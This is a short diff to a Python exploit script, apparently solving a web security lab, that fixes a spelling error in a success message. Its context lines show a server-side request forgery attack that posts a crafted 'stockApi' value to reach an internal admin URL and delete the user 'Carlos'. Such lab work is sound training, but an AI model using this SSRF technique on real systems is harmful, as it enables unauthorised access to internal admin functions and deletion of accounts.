@@ -31,7 +31,7 @@ def delete_user(url, admin_ip_address):
     param2 = {'stockApi' : check_admin_url_ssrf_payload}
     r = requests.post(url + check_stock_path, data=param2, verify=False, proxies=proxies)
     if 'User deleted successfully' in r.text:
-        print("(+) Successfuly delelted Carlos user")
+        print("(+) Successfuly deleted Carlos user")
     else:
         print("(-) Exploit was uncuccesseful")
 
